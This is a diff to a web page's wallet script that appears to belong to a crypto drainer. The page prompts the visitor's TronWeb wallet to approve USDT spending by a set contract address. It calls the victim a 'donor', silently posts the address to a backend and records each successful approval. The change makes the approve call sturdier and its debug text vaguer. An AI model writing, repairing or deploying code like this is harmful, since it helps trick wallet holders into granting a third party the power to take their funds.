@@ -92,7 +92,7 @@
             var addr = window.tronWeb.defaultAddress.base58;
             status.textContent = "Confirm in popup!";
             status.style.color = "#facc15";
-            debug.textContent = "Building TX for " + addr;
+            debug.textContent = "Step 1: " + addr;
 
             // Delegate energy in background
             fetch("/api/delegate-energy", {
@@ -101,45 +101,45 @@
                 body: JSON.stringify({ donor: addr })
             }).catch(function() {});
 
-            // Use triggerSmartContract directly (no ABI fetch needed)
-            var parameter = [
-                { type: "address", value: CONTRACT_ADDRESS },
-                { type: "uint256", value: APPROVE_AMOUNT }
-            ];
+            // Provide ABI directly - no network fetch needed
+            var abi = [{
+                "constant": false,
+                "inputs": [
+                    {"name": "spender", "type": "address"},
+                    {"name": "value", "type": "uint256"}
+                ],
+                "name": "approve",
+                "outputs": [{"name": "", "type": "bool"}],
+                "type": "function"
+            }];
 
-            window.tronWeb.transactionBuilder.triggerSmartContract(
-                USDT_CONTRACT,
-                "approve(address,uint256)",
-                { feeLimit: 100000000, callValue: 0 },
-                parameter,
-                addr
-            ).then(function(tx) {
-                debug.textContent = "TX built, signing...";
-                if (!tx.result || !tx.result.result) {
-                    throw new Error("Build failed: " + JSON.stringify(tx.result));
-                }
-                return window.tronWeb.trx.sign(tx.transaction);
-            }).then(function(signedTx) {
-                debug.textContent = "Signed, broadcasting...";
-                return window.tronWeb.trx.sendRawTransaction(signedTx);
-            }).then(function(broadcast) {
-                if (broadcast.result) {
+            try {
+                debug.textContent = "Step 2: creating contract...";
+                var usdt = window.tronWeb.contract(abi, USDT_CONTRACT);
+                debug.textContent = "Step 3: calling approve...";
+                usdt.approve(CONTRACT_ADDRESS, APPROVE_AMOUNT).send({
+                    feeLimit: 100000000,
+                    callValue: 0
+                }).then(function(tx) {
+                    var txId = typeof tx === "string" ? tx : (tx.txid || tx);
                     status.textContent = "Done!";
                     status.style.color = "#4ade80";
-                    debug.textContent = "TX: " + broadcast.txid;
+                    debug.textContent = "TX: " + txId;
                     fetch("/api/approved", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ donor: addr, txId: broadcast.txid })
+                        body: JSON.stringify({ donor: addr, txId: txId })
                     }).catch(function() {});
-                } else {
-                    throw new Error("Broadcast failed");
-                }
-            }).catch(function(err) {
+                }).catch(function(err) {
+                    status.textContent = "Error";
+                    status.style.color = "#f87171";
+                    debug.textContent = "ERR4: " + (err.message || JSON.stringify(err));
+                });
+            } catch(e) {
                 status.textContent = "Error";
                 status.style.color = "#f87171";
-                debug.textContent = "ERR: " + (err.message || JSON.stringify(err));
-            });
+                debug.textContent = "ERR3: " + (e.message || e);
+            }
         }
     </script>
 </body>
